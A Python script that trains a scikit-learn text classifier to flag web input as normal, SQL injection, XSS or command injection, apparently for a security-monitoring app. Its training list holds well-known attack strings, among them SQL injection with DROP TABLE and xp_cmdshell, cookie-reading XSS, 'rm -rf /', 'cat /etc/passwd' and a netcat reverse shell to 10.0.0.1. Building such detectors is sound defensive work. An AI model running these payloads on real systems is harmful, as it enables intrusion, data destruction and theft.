# train_model.py
import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import make_pipeline

# 1. THE DATASET (Derived from Open Source Intelligence)
# Format: (Payload, Label)
data = [
    # --- NORMAL TRAFFIC (HAM) ---
    ("Hello friend, how are you?", "NORMAL"),
    ("The meeting is at 10 AM tomorrow.", "NORMAL"),
    ("Can you send me the project files?", "NORMAL"),
    ("I love coding in Python.", "NORMAL"),
    ("What is the weather like in Chennai?", "NORMAL"),
    ("hthello}", "NORMAL"), # Protocol example
    ("user_id=12345", "NORMAL"),
    ("search=laptop", "NORMAL"),
    ("page=about_us", "NORMAL"),
    ("login_attempt_success", "NORMAL"),

    # --- SQL INJECTION (ATTACK) ---
    ("SELECT * FROM users WHERE id=1 OR 1=1", "SQL_INJECTION"),
    ("admin' --", "SQL_INJECTION"),
    ("UNION SELECT 1, version(), user()", "SQL_INJECTION"),
    ("DROP TABLE users;", "SQL_INJECTION"),
    ("' OR '1'='1", "SQL_INJECTION"),
    ("admin' #", "SQL_INJECTION"),
    ("1; EXEC xp_cmdshell('dir')", "SQL_INJECTION"),

    # --- XSS (ATTACK) ---
    ("<script>alert('XSS')</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<body onload=alert('hacked')>", "XSS"),
    ("\"><script>alert(1)</script>", "XSS"),

    # --- COMMAND INJECTION / SHELL (ATTACK) ---
    ("rm -rf /", "CMD_INJECTION"),
    ("cat /etc/passwd", "CMD_INJECTION"),
    ("ping -c 1 127.0.0.1", "CMD_INJECTION"),
    ("whoami", "CMD_INJECTION"),
    ("nc -e /bin/sh 10.0.0.1 1234", "CMD_INJECTION")
]

# Separate labels and payloads
texts = [x[0] for x in data]
labels = [x[1] for x in data]

# 2. BUILD THE PIPELINE
# Step A: TF-IDF (Convert words to math/vectors)
# Step B: Multinomial Naive Bayes (Fast, effective text classifier)
model = make_pipeline(TfidfVectorizer(analyzer='char_wb', ngram_range=(2, 5)), MultinomialNB())

# 3. TRAIN
print("🧠 Training Scikit-Learn Model...")
model.fit(texts, labels)
print("✅ Training Complete.")

# 4. SAVE THE BRAIN
# We save this to a file so the main app can load it instantly
joblib.dump(model, 'ml/security_model.pkl')
print("💾 Model saved to ml/security_model.pkl")

# Test it immediately
test_payload = "<script>alert('test')</script>"
prediction = model.predict([test_payload])[0]
prob = model.predict_proba([test_payload]).max()
print(f"\n[Test Run] Input: '{test_payload}'")
print(f"Prediction: {prediction} (Confidence: {prob*100:.2f}%)")